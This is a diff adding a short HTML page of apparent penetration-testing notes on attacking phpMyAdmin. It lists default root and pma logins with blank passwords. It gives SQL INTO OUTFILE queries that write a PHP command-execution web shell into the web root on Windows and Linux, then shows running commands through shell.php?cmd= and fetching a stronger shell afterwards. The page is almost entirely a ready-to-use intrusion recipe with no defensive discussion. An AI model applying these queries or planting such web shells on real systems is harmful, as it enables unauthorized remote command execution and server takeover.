@@ -1,0 +1,21 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Phpmyadmin</title>
+</head><body>Default credentials<br/>
+root &lt;blank&gt;<br/>
+pma &lt;blank&gt;<br/>
+<br/>
+Upload a shell.<br/>
+You go to:<br/>
+http://192.168.1.101/phpmyadmin/<br/>
+Then click on SQL.<br/>
+Run SQL query/queries on server "localhost":<br/>
+From here we can just run a sql-query that creates a php script that works as a shell<br/>
+So we add the following query:<br/>
+SELECT "&lt;?php system($_GET['cmd']); ?&gt;" into outfile "C:\\xampp\\htdocs\\shell.php"<br/>
+<br/>
+# For linux<br/>
+SELECT "&lt;?php system($_GET['cmd']); ?&gt;" into outfile "/var/www/html/shell.php"<br/>
+The query is pretty self-explanatory. Now you just visit 192.168.1.101/shell.php?cmd=ipconfig and you have a working web-shell. We can of course just write a superlong query with a better shell. But sometimes it is easier to just upload a simple web-shell, and from there download a better shell.</body></html>
